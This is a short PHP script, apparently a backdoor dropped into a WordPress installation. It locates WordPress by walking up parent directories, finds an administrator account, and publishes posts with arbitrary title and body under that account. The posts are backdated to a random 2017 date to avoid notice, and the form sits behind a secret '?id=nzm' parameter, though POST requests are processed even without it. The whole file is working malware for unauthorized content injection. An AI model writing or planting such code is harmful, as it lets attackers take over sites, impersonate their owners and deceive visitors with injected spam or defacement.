<?php

$opmsg = "";
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
	$found = false;
	for ($i = 0; $i <= 6; $i++) {
		$prefix = implode("", array_fill(1, $i, "../"));
		$headerphpf = $prefix . "wp-blog-header.php";
		$registphpf = $prefix . "wp-includes/registration.php";
		
		if (file_exists($headerphpf) && file_exists($registphpf)) {
			require_once($headerphpf);
			require_once($registphpf);
			$found = true;
			break;
		}
	}

	if($found == false){
		die("wordpress bulunamadi");
	}

	$users = $wpdb->get_results( "SELECT ID FROM $wpdb->users ORDER BY ID ASC" );
	$authorId = 0;
	$firstUserId = 0;

	if( $users ) {
		foreach ( $users as $user ) {
			if($firstUserId == 0){
				$firstUserId = $user->ID;
			}
			$wp_user = new WP_User( $user->ID );
			if ( in_array( 'administrator', (array) $wp_user->roles ) ) {
				$authorId = $user->ID;
				break;
			}
		}
	}

	if($authorId == 0 && $firstUserId != 0){
		$authorId = $firstUserId;
	}
	
	if($authorId == 0) {
		die("post ekleyecek user bulunamadi");
	}

	// 2017 yılında rastgele bir tarih
	$dtz = 1483228800 + (rand(1, 365) * 86400) + rand(1, 86400);

	$pvars = [];
	$pvars["comment_status"] = "closed";
	$pvars["ping_status"] = "closed";
	$pvars["post_status"] = "publish";
	$pvars["post_date"] = gmdate("Y-m-d H:i:s", $dtz);
	$pvars["post_author"] = $authorId;
	$pvars["post_title"] = $_POST["title"];
	$pvars["post_content"] = $_POST["body"];
	$post = wp_insert_post($pvars, false, false);
	$perm = get_permalink($post);
	
	$opmsg = 'Yeni POST eklendi: <a target="_blank" href="'. $perm .'">'. $perm . '</a>';
}

if(!isset($_GET["id"]) || $_GET["id"] != "nzm"){
	die();
}
?><!DOCTYPE html>
<html lang="tr">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PostGöt</title>
  </head>
  <body>
		<?php 
			if(strlen($opmsg)>0) {
				echo $opmsg . "<hr>"; 
			}
		?>
		<form method="post" action="?id=nzm">
			Başlık: <br><input type="text" name="title"><br>
			Post: <br><textarea name="body" rows="16" cols="100"></textarea><br>
			<input value="Gönder" type="submit">
		</form>
  </body>
</html>